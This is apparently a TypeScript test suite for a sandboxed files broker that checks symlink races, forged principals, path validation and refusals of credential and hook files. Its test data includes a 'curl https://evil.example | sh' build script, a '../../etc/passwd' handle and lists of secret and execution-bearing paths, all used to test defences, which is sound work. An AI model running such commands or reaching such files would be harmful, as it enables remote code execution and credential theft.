/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/**
 * The files broker (spec I.2, INV-12): handle-based, mediated I/O for a principal, through the
 * Policy Authority on every call.
 *
 * RACE-1..3: a second process swaps a folder for a symlink to a folder outside the scope during
 * 1,000 handle writes (RACE-1) and 1,000 open-and-read cycles (RACE-2), and a grant is revoked
 * between the check and the use (RACE-3). Adversarial cases: a forged principal, a handle widened
 * to another mode or used by another principal, a revoked or closed handle, `..` and NFC/NFD
 * spellings, case folding on APFS, hard links, execution-bearing files, limits and the audit.
 *
 * macOS runs everything (O_NOFOLLOW_ANY). Linux needs `volt-fsd` for writes (the container rig
 * builds it): without it the cases that write skip loudly, or FAIL when VOLT_SANDBOX_REQUIRED is
 * set. Windows is compile-checked only.
 */

import assert from 'assert';
import { ChildProcess, spawn } from 'child_process';
import { existsSync, promises as fs } from 'fs';
import { tmpdir } from 'os';
import { DisposableStore } from '../../../../base/common/lifecycle.js';
import { join } from '../../../../base/common/path.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { BuildEntryGuard } from '../../../voltGit/node/buildEntryGuard.js';
import { helperIntegrity } from '../../../voltHelpers/node/helperIntegrity.js';
import { IManifestView } from '../../../voltSandbox/common/authority.js';
import { chatSubject, ICallContext, IPrincipal, SubjectKey } from '../../../voltSandbox/common/principals.js';
import { BrokerHost, grant, outcome } from '../../../voltSandbox/test/node/brokerFixture.js';
import { SANDBOX_REQUIRED as required, writeSkipNotice } from '../../../voltSandbox/test/node/sandboxSuiteGate.js';
import { declaredFileRoots, filesPlan, IFilesScope, validateBrokerPath } from '../../common/filesBroker.js';
import { FilesBroker, IFilesBrokerOptions } from '../../node/filesBroker.js';

const isMac = process.platform === 'darwin';
const isLinux = process.platform === 'linux';
const fsdPath = isLinux ? [process.env.VOLT_FSD_PATH, join(process.cwd(), '.build', 'volt-fsd')].find((path): path is string => !!path && existsSync(path)) : undefined;
const supported = isMac || (isLinux && !!fsdPath);
const safeTest = supported ? test : test.skip;
const RACE_OPS = 1_000;

if (fsdPath) {
	const trusted = await helperIntegrity().trustDeveloperHelper('volt-fsd', fsdPath);
	if (!trusted.ok) {
		throw new Error(`volt-fsd at ${fsdPath} was refused: ${trusted.reason}`);
	}
}

const PLUGIN: SubjectKey = 'plugin:acme.notes@local';
const READER: SubjectKey = 'plugin:acme.reader@local';
const CHAT = chatSubject('read-only-chat');

/** Swaps `target` between a real folder and a symlink to `linkTo` until killed (see safeOpen.test.ts). */
function startFlipper(target: string, linkTo: string): { readonly child: ChildProcess; readonly flips: () => Promise<number> } {
	const script = `
		const fs = require('fs');
		const target = process.argv[1], linkTo = process.argv[2];
		const real = target + '.real', link = target + '.link';
		const present = path => { try { fs.lstatSync(path); return true; } catch { return false; } };
		const restore = () => { if (!present(real)) { fs.mkdirSync(real); } if (!present(link)) { fs.symlinkSync(linkTo, link); } };
		const flip = from => {
			try { fs.renameSync(from, target); } catch { try { fs.rmSync(target, { recursive: true, force: true }); } catch { } return; }
			try { fs.renameSync(target, from); } catch { }
			flips++;
		};
		let flips = 0;
		process.on('SIGTERM', () => { fs.writeFileSync(target + '.flips', String(flips)); process.exit(0); });
		const tick = () => { for (let i = 0; i < 200; i++) { restore(); flip(real); flip(link); } setImmediate(tick); };
		tick();
	`;
	const child = spawn(process.execPath, ['-e', script, target, linkTo], { env: { ELECTRON_RUN_AS_NODE: '1' }, stdio: 'ignore' });
	return {
		child,
		flips: async () => {
			if (child.exitCode === null && child.signalCode === null) {
				const exited = new Promise(resolve => child.once('exit', resolve));
				child.kill('SIGTERM');
				await exited;
			}
			return Number(await fs.readFile(`${target}.flips`, 'utf8').catch(() => '0'));
		},
	};
}

async function listAll(dir: string): Promise<string[]> {
	const out: string[] = [];
	for (const entry of await fs.readdir(dir, { withFileTypes: true })) {
		out.push(entry.name);
		if (entry.isDirectory()) {
			out.push(...(await listAll(join(dir, entry.name))).map(name => `${entry.name}/${name}`));
		}
	}
	return out;
}

suite('Volt files broker (I.2)', () => {

	const disposables = ensureNoDisposablesAreLeakedInTestSuite();

	let base: string;
	let ws: string;
	let home: string;
	let outside: string;
	let store: DisposableStore;
	let host: BrokerHost;
	let broker: FilesBroker;
	let guard: BuildEntryGuard;
	const flippers: ChildProcess[] = [];

	const manifests = (): IManifestView[] => [
		{ subject: PLUGIN, declared: [{ id: 'files.read:workspace' }, { id: 'files.write' }], network: 'none' },
		{ subject: READER, declared: [{ id: 'files.read:workspace' }], network: 'none' },
	];

	function scope(principal: IPrincipal): IFilesScope | undefined {
		if (principal.subject === CHAT) {
			return { roots: [ws], home, platform: process.platform, chat: { level: 'read-only', network: false } };
		}
		return { roots: [ws], home, platform: process.platform };
	}

	function make(extra: Partial<IFilesBrokerOptions> = {}): FilesBroker {
		return store.add(new FilesBroker({ authority: host.authority, callers: host.registry, audit: host.audit, scope, safeOpen: { fsdPath }, guard, now: () => Date.now(), ...extra }));
	}

	suiteSetup(() => {
		if (isLinux && !fsdPath) {
			const message = 'volt-fsd is not built here: the files broker\'s write cases cannot run on Linux';
			if (required) {
				throw new Error(`${message} (VOLT_SANDBOX_REQUIRED is set; failing instead of skipping)`);
			}
			writeSkipNotice(`${message}. Build it with scripts/volt-sandbox-linux-test.sh files.`, 'They are');
		}
	});

	setup(async () => {
		base = await fs.realpath(await fs.mkdtemp(join(tmpdir(), 'volt-files-broker-')));
		ws = join(base, 'ws');
		home = join(base, 'home');
		outside = join(base, 'elsewhere');
		await Promise.all([fs.mkdir(ws), fs.mkdir(join(home, '.ssh'), { recursive: true }), fs.mkdir(outside)]);
		await fs.writeFile(join(home, '.ssh', 'id_rsa'), 'PRIVATE KEY');
		await fs.writeFile(join(outside, 'canary.txt'), 'OUTSIDE');
		store = disposables.add(new DisposableStore());
		guard = new BuildEntryGuard(join(base, 'trust'), home);
		host = new BrokerHost(store, {
			manifests: manifests(),
			grants: [grant(PLUGIN, 'files.write')],
			chats: [{ subject: CHAT, settings: { level: 'read-only', network: false }, folder: ws }],
			home,
		});
		broker = make();
	});

	teardown(async () => {
		for (const child of flippers.splice(0)) {
			child.kill('SIGKILL');
		}
		await fs.rm(base, { recursive: true, force: true });
	});

	safeTest('handles: open, read in chunks, write, stat and close; every call is audited', async () => {
		const { context } = host.connect(PLUGIN);
		await fs.writeFile(join(ws, 'a.txt'), 'hello world');
		const { handle, size } = await broker.open(context, { path: join(ws, 'a.txt'), mode: 'read' });
		assert.strictEqual(size, 11);
		const first = await broker.read(context, { handle, offset: 0, length: 5 });
		assert.strictEqual(Buffer.from(first.data).toString(), 'hello');
		assert.strictEqual(first.eof, false);
		const rest = await broker.read(context, { handle, offset: 5 });
		assert.strictEqual(Buffer.from(rest.data).toString(), ' world');
		assert.strictEqual(rest.eof, true);
		await broker.close(context, { handle });

		const writer = await broker.open(context, { path: join(ws, 'sub', 'b.txt'), mode: 'write' });
		const written = await broker.write(context, { handle: writer.handle, data: 'new file' });
		assert.deepStrictEqual(written, { bytes: 8, created: true });
		assert.strictEqual(await fs.readFile(join(ws, 'sub', 'b.txt'), 'utf8'), 'new file');
		assert.strictEqual((await broker.stat(context, { handle: writer.handle })).size, 8);
		await broker.close(context, { handle: writer.handle });

		const methods = host.audit.events.map(event => `${event.method}:${event.decision}`);
		assert.deepStrictEqual(methods, ['open:allow', 'read:allow', 'read:allow', 'close:allow', 'open:allow', 'write:allow', 'stat:allow', 'close:allow']);
		// AUDIT-1: principal, chain and epoch; the target is redacted (the sink hashes it), never the path.
		const event = host.audit.events[0];
		assert.strictEqual(event.subject, PLUGIN);
		assert.strictEqual(event.epoch, 1);
		assert.ok(event.target && !event.target.includes('a.txt'));
	});

	safeTest('RACE-1: a folder flipped to a symlink during 1,000 handle writes never sends a byte outside', async () => {
		const { context } = host.connect(PLUGIN);
		const dir = join(ws, 'dir');
		await fs.mkdir(dir);
		const { handle } = await broker.open(context, { path: join(dir, 'a.txt'), mode: 'write' });
		await fs.rmdir(dir);
		const flipper = startFlipper(dir, outside);
		flippers.push(flipper.child);
		const results = { ok: 0, refused: 0 };
		for (let i = 0; i < RACE_OPS; i++) {
			const result = await outcome(broker.write(context, { handle, data: `write ${i}` }));
			if (result === 'ok') {
				results.ok++;
			} else {
				assert.ok(result === 'denied' || result === 'io', `write ${i}: ${result}`);
				results.refused++;
			}
		}
		const flips = await flipper.flips();
		assert.ok(flips > 0, 'the flipper never swapped the folder');
		assert.ok(results.refused > 0, 'no write met the symlink: the race did not happen');
		assert.deepStrictEqual((await listAll(outside)).sort(), ['canary.txt']);
		assert.strictEqual(await fs.readFile(join(outside, 'canary.txt'), 'utf8'), 'OUTSIDE');
	});

	test('RACE-2: 1,000 open-and-read cycles through a flipping folder never return what is outside', async () => {
		const { context } = host.connect(READER);
		const dir = join(ws, 'dir');
		await fs.writeFile(join(outside, 'a.txt'), 'OUTSIDE');
		const flipper = startFlipper(dir, outside);
		flippers.push(flipper.child);
		// The real folder the flipper restores has no a.txt: only the link side has one.
		let read = 0;
		for (let i = 0; i < RACE_OPS; i++) {
			try {
				const { handle } = await broker.open(context, { path: join(dir, 'a.txt'), mode: 'read' });
				const { data } = await broker.read(context, { handle });
				await broker.close(context, { handle });
				assert.notStrictEqual(Buffer.from(data).toString(), 'OUTSIDE', `read ${i} came from outside the workspace`);
				read++;
			} catch (err) {
				assert.ok(err instanceof Error && err.name === 'BrokerError', String(err));
			}
		}
		assert.ok(await flipper.flips() > 0, 'the flipper never swapped the folder');
		assert.strictEqual(read, 0, 'nothing should have been readable: the only a.txt is outside');
	});

	safeTest('RACE-3: a grant revoked between the open and the use stops the next operation, and concurrent writes after it', async () => {
		const { context } = host.connect(PLUGIN);
		const { handle } = await broker.open(context, { path: join(ws, 'a.txt'), mode: 'write' });
		assert.strictEqual(await outcome(broker.write(context, { handle, data: 'before' })), 'ok');
		const inFlight = Array.from({ length: 20 }, (_, i) => broker.write(context, { handle, data: `in flight ${i}` }).then(() => 'ok', () => 'refused'));
		host.update({ grants: [] });
		const after = await Promise.all(Array.from({ length: 20 }, () => outcome(broker.write(context, { handle, data: 'after' }))));
		assert.deepStrictEqual([...new Set(after)], ['denied']);
		await Promise.all(inFlight);
		assert.notStrictEqual(await fs.readFile(join(ws, 'a.txt'), 'utf8'), 'after');
		const denial = host.audit.events.find(event => event.method === 'write' && event.decision === 'deny');
		assert.strictEqual(denial?.deniedBy, 'authority');
		assert.strictEqual(denial?.epoch, 2);
	});

	test('IPC-FILES-1: a forged principal (a context this host did not build) is refused', async () => {
		const { context, principal } = host.connect(PLUGIN);
		const forged: ICallContext = { principal: { ...principal }, onBehalfOf: [], requestId: 'forged' };
		assert.strictEqual(await outcome(broker.open(forged, { path: join(ws, 'a.txt') })), 'unauthenticated');
		const claimed: ICallContext = { ...context, principal: { ...principal, subject: 'firstparty:volt.customize' } };
		assert.strictEqual(await outcome(broker.open(claimed, { path: join(ws, 'a.txt') })), 'unauthenticated');
		assert.strictEqual(await outcome(broker.open({ ...context }, { path: join(ws, 'a.txt') })), 'unauthenticated');
	});

	safeTest('IPC-FILES-2: a handle used for another mode or by another principal is refused', async () => {
		const owner = host.connect(PLUGIN);
		const thief = host.connect(PLUGIN);
		await fs.writeFile(join(ws, 'a.txt'), 'data');
		const { handle } = await broker.open(owner.context, { path: join(ws, 'a.txt'), mode: 'read' });
		assert.strictEqual(await outcome(broker.write(owner.context, { handle, data: 'widened' })), 'handle');
		assert.strictEqual(await outcome(broker.read(thief.context, { handle })), 'handle');
		assert.strictEqual(await outcome(broker.close(thief.context, { handle })), 'handle');
		assert.strictEqual(await outcome(broker.read(owner.context, { handle: 'A'.repeat(22) })), 'handle');
		assert.strictEqual(await outcome(broker.read(owner.context, { handle: '../../etc/passwd' })), 'handle');
		assert.strictEqual(await fs.readFile(join(ws, 'a.txt'), 'utf8'), 'data');
	});

	test('REV-FILES-1: a revoked principal\'s and a closed handle stop working', async () => {
		const { context, principal } = host.connect(READER);
		await fs.writeFile(join(ws, 'a.txt'), 'data');
		const first = await broker.open(context, { path: join(ws, 'a.txt') });
		const second = await broker.open(context, { path: join(ws, 'a.txt') });
		await broker.close(context, { handle: second.handle });
		assert.strictEqual(await outcome(broker.read(context, { handle: second.handle })), 'handle');
		host.registry.revoke(principal.id);
		assert.strictEqual(broker.openHandles(principal.id), 0);
		assert.strictEqual(await outcome(broker.read(context, { handle: first.handle })), 'unauthenticated');
	});

	test('validation: `..`, `.`, control characters, relative and NFD paths are refused, not mapped', async () => {
		const { context } = host.connect(READER);
		// allow-any-unicode-next-line
		const nfd = join(ws, 'cafe\u0301.txt');
		for (const path of [`${ws}/../elsewhere/canary.txt`, `${ws}/./a.txt`, 'a.txt', `${ws}/a\u0007.txt`, nfd, 42, undefined]) {
			assert.strictEqual(await outcome(broker.open(context, { path })), 'invalid', String(path));
		}
		assert.throws(() => validateBrokerPath('C:\\ws\\PROGRA~1\\x', 'win32'));
		assert.throws(() => validateBrokerPath('C:\\ws\\a.txt:secret', 'win32'));
		assert.throws(() => validateBrokerPath('\\\\?\\C:\\ws\\a.txt', 'win32'));
		assert.throws(() => validateBrokerPath('C:\\ws\\NUL', 'win32'));
		assert.throws(() => validateBrokerPath('C:\\ws\\a.txt.', 'win32'));
		assert.strictEqual(validateBrokerPath('C:/ws/a.txt', 'win32'), 'C:\\ws\\a.txt');
	});

	test('floor: credential folders, secret files and outside the scope are refused, through symlinks and case spellings', async () => {
		const { context } = host.connect(READER);
		await fs.symlink(join(home, '.ssh'), join(ws, 'keys'));
		await fs.symlink(join(outside, 'canary.txt'), join(ws, 'canary.txt'));
		await fs.writeFile(join(ws, '.env'), 'SECRET=1');
		const targets = [join(home, '.ssh', 'id_rsa'), join(ws, 'keys', 'id_rsa'), join(ws, 'canary.txt'), join(ws, '.env'), join(outside, 'canary.txt')];
		if (isMac) {
			targets.push(join(home, '.SSH', 'id_rsa'), join(ws, '.ENV'));
		}
		for (const path of targets) {
			assert.strictEqual(await outcome(broker.open(context, { path })), 'denied', path);
		}
		// A principal whose scope declares the home folder still never reads its credentials (case folded on APFS).
		const wide: IFilesScope = { roots: [ws], declaredRoots: [home], home, platform: 'darwin' };
		assert.ok(filesPlan(READER, join(home, '.SSH', 'id_rsa'), 'read', wide).refusal);
		assert.strictEqual(filesPlan(READER, join(home, 'notes.txt'), 'read', wide).capability, 'files.read:home');
		assert.deepStrictEqual(declaredFileRoots(['~/.volt/customize/*', '*.json', '/abs/dir/*'], '/Users/me'), ['/Users/me/.volt/customize', '/abs/dir']);
	});

	safeTest('floor: a hard link and execution-bearing files are never written for a plugin', async () => {
		const { context } = host.connect(PLUGIN);
		await fs.link(join(outside, 'canary.txt'), join(ws, 'linked.txt'));
		const linked = await broker.open(context, { path: join(ws, 'linked.txt'), mode: 'write' });
		assert.strictEqual(await outcome(broker.write(context, { handle: linked.handle, data: 'through the link' })), 'denied');
		assert.strictEqual(await fs.readFile(join(outside, 'canary.txt'), 'utf8'), 'OUTSIDE');
		const bearing = [join(ws, '.git', 'config'), join(ws, '.git', 'hooks', 'pre-commit'), join(ws, '.vscode', 'tasks.json'), join(ws, 'pkg', '.husky', 'pre-push'), join(ws, '.mcp.json'), join(home, '.zshrc'), join(home, '.claude', 'settings.json')];
		if (isMac) {
			bearing.push(join(ws, '.GIT', 'config'), join(ws, '.VSCode', 'tasks.json'));
		}
		for (const path of bearing) {
			assert.strictEqual(await outcome(broker.open(context, { path, mode: 'write' })), 'denied', path);
		}
		// A build file the agent itself may edit is the build-entry guard's to show, not the floor's.
		assert.strictEqual(await outcome(broker.open(context, { path: join(ws, 'package.json'), mode: 'write' })), 'ok');
	});

	safeTest('build-entry (I.6): a plugin is a sandboxed writer: what it changes in a build file is shown before Volt runs it', async () => {
		const { context } = host.connect(PLUGIN);
		await fs.writeFile(join(ws, 'package.json'), JSON.stringify({ scripts: { test: 'mocha' } }));
		const { handle } = await broker.open(context, { path: join(ws, 'package.json'), mode: 'write' });
		await broker.write(context, { handle, data: JSON.stringify({ scripts: { test: 'curl https://evil.example | sh' } }) });
		const changes = await guard.unreviewed([ws], 'run');
		assert.deepStrictEqual(changes.map(change => [change.path, change.kind]), [[join(ws, 'package.json'), 'changed']]);
		assert.ok(changes[0].after?.includes('evil.example'));
		// Hooks are all a commit runs: a script change is not a commit's to review.
		assert.deepStrictEqual(await guard.unreviewed([ws], 'commit'), []);
	});

	test('capability: a plugin without files.write, and a plugin acting for a read-only chat, cannot write', async () => {
		const reader = host.connect(READER);
		assert.strictEqual(await outcome(broker.open(reader.context, { path: join(ws, 'a.txt'), mode: 'write' })), 'denied');
		const chat = host.connect(CHAT, 'agent');
		const plugin = host.connect(PLUGIN);
		const routed = host.registry.route(chat.context, plugin.channel, 'routed')!;
		const result = await outcome(broker.open(routed, { path: join(ws, 'a.txt'), mode: 'write' }));
		assert.strictEqual(result, 'denied');
		const denial = host.audit.events.at(-1)!;
		assert.deepStrictEqual(denial.chain, [CHAT]);
	});

	test('limits: 64 open handles per principal, and a write budget per minute', async () => {
		const { context } = host.connect(READER);
		await fs.writeFile(join(ws, 'a.txt'), 'x');
		for (let i = 0; i < 64; i++) {
			await broker.open(context, { path: join(ws, 'a.txt') });
		}
		assert.strictEqual(await outcome(broker.open(context, { path: join(ws, 'a.txt') })), 'limit');
		// Another principal has its own budget.
		const other = host.connect(READER);
		assert.strictEqual(await outcome(broker.open(other.context, { path: join(ws, 'a.txt') })), 'ok');
		if (supported) {
			const small = make({ limits: { writeBytesPerMinute: 10 } });
			const writer = host.connect(PLUGIN);
			const { handle } = await small.open(writer.context, { path: join(ws, 'b.txt'), mode: 'write' });
			assert.strictEqual(await outcome(small.write(writer.context, { handle, data: '12345678' })), 'ok');
			assert.strictEqual(await outcome(small.write(writer.context, { handle, data: '12345678' })), 'limit');
		}
	});
});
